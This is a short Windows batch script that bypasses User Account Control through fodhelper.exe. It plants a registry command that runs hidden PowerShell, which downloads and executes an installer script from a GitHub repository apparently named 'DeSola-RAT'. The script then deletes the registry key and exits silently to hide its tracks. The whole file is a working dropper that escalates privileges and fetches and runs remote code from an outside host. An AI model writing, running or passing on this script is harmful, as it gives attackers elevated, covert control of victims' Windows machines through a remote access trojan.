@echo off
setlocal enabledelayedexpansion

:: UAC Bypass via fodhelper.exe (no prompt)
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/r00tm4st3r/DeSola-RAT/refs/heads/main/files/installer.ps1')\"" /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v "DelegateExecute" /t REG_SZ /d "" /f >nul 2>&1

:: Trigger fodhelper
fodhelper.exe >nul 2>&1

:: Clean registry
reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1

:: Exit silently
exit /b